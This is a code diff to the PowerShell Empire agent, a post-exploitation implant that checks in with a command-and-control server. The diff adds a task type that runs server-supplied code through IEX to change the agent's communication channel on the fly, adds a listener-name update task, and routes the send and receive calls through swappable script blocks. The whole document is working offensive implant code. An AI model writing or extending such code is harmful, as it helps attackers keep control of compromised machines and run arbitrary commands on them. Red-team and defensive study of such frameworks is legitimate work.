@@ -100,7 +100,8 @@ function Invoke-Empire {
     $script:ResultIDs = @{}
     $script:WorkingHours = $WorkingHours
     $script:DefaultResponse = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($DefaultResponse))
-    $Script:Proxy = $ProxySettings
+    $script:Proxy = $ProxySettings
+    $script:CurrentListenerName = ""
 
     # the currently active server
     $Script:ServerIndex = 0
@@ -781,7 +782,7 @@ function Invoke-Empire {
                 $msg = "[!] Agent "+$script:SessionID+" exiting"
                 # this is the only time we send a message out of the normal process,
                 #   because we're exited immediately after
-                Send-Message -Packets $(Encode-Packet -type $type -data $msg -ResultID $ResultID)
+                (& $SendMessage -Packets $(Encode-Packet -type $type -data $msg -ResultID $ResultID))
                 exit
             }
             # shell command
@@ -969,6 +970,27 @@ function Invoke-Empire {
                 }
             }
 
+            elseif($type -eq 130) {
+                #Dynamically update agent comms
+                
+                try {
+                    IEX $data
+
+                    Encode-Packet -type $type -data ($CurrentListenerName) -ResultID $ResultID
+                }
+                catch {
+                    
+                    Encode-Packet -type 0 -data ("Unable to update agent comm methods: $_") -ResultID $ResultID
+                }
+            }
+
+            elseif($type -eq 131) {
+                # Update the listener name variable
+                $script:CurrentListenerName = $data
+
+                Encode-Packet -type $type -data ("Updated the CurrentListenerName to: $CurrentListenerName") -ResultID $ResultID
+            }
+
             else{
                 Encode-Packet -type 0 -data "invalid type: $type" -ResultID $ResultID
             }
@@ -1023,7 +1045,7 @@ function Invoke-Empire {
         }
 
         # send all the result packets back to the C2 server
-        Send-Message -Packets $ResultPackets
+        (& $SendMessage -Packets $ResultPackets)
     }
 
 
@@ -1050,7 +1072,7 @@ function Invoke-Empire {
 
             # send job results back if there are any
             if ($Packets) {
-                Send-Message -Packets $Packets
+                (& $SendMessage -Packets $Packets)
             }
 
             # send an exit status message and exit
@@ -1060,7 +1082,7 @@ function Invoke-Empire {
             else {
                 $msg = "[!] Agent "+$script:SessionID+" exiting: Lost limit reached"
             }
-            Send-Message -Packets $(Encode-Packet -type 2 -data $msg)
+            (& $SendMessage -Packets $(Encode-Packet -type 2 -data $msg))
             exit
         }
 
@@ -1131,11 +1153,11 @@ function Invoke-Empire {
         }
 
         if ($JobResults) {
-            Send-Message -Packets $JobResults
+            ((& $SendMessage -Packets $JobResults))
         }
 
         # get the next task from the server
-        $TaskData = Get-Task
+        $TaskData = (& $GetTask)
         if ($TaskData) {
             $script:MissedCheckins = 0
             # did we get not get the default response
